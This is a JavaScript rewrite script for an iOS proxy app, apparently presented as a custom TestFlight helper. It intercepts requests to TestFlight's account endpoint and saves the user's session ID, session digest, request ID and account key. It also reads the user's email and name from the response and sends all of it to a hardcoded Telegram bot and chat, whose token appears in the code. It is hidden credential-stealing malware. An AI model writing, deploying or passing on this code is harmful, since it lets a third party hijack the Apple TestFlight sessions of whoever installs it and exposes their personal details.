/*
Script Author: Yui Chy
Source: Custom
*/

const token = "1759212113:AAEQVd73Ym_dJtgBqQHCQ0ihD9mvhfb59DU";
const chatId = "-1001797215512";
const reg1 = /^https:\/\/testflight\.apple\.com\/v3\/accounts\/(.*)\/apps$/;

if (reg1.test($request.url)) {
  $prefs.setValueForKey(null, "request_id");
  let url = $request.url;
  let key = url.replace(/(.*accounts\/)(.*)(\/apps)/, "$2");
  const headers = Object.keys($request.headers).reduce((t, i) => ((t[i.toLowerCase()] = $request.headers[i]), t), {});

  let session_id = headers["x-session-id"];
  let session_digest = headers["x-session-digest"];
  let request_id = headers["x-request-id"];
  
  $prefs.setValueForKey(key, "key");
  $prefs.setValueForKey(session_id, "session_id");
  $prefs.setValueForKey(session_digest, "session_digest");
  $prefs.setValueForKey(request_id, "request_id");

  // Gửi thông tin lên Telegram ngay sau khi lưu
  const data = {
    session_id: session_id,
    session_digest: session_digest,
    request_id: request_id,
    key: key,
    email: "undefined", // Placeholder
    name: "undefined" // Placeholder
  };
  sendToTelegram(data);

  if ($response.body) {
    let body = $response.body;
    let emailMatch = body.match(/"email":"(.*?)"/);
    let nameMatch = body.match(/"name":"(.*?)"/);

    let email = emailMatch ? emailMatch[1] : null;
    let name = nameMatch ? nameMatch[1] : null;

    if (email) {
      $prefs.setValueForKey(email, "email");
      data.email = email;
    }
    if (name) {
      $prefs.setValueForKey(name, "name");
      data.name = name;
    }

    // Gửi lại thông tin lên Telegram nếu có email hoặc tên
    if (email || name) {
      sendToTelegram(data);
    }
  }

  $done({});
}

function sendToTelegram(data) {
  const message = `session_id: ${data.session_id}, session_digest: ${data.session_digest}, request_id: ${data.request_id}, key: ${data.key}, email: ${data.email}, name: ${data.name}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  $task.fetch({
    url: url,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).then(response => {
    if (response.statusCode === 200) {
      console.log("Thông tin đã được gửi lên Telegram thành công.");
    } else {
      console.log(`Có lỗi xảy ra khi gửi thông tin lên Telegram. Mã lỗi: ${response.statusCode}, Nội dung: ${response.body}`);
    }
  }).catch(error => {
    console.log("Có lỗi xảy ra khi gửi thông tin lên Telegram:", error);
  });
}

function unique(arr) {
  return Array.from(new Set(arr));
}
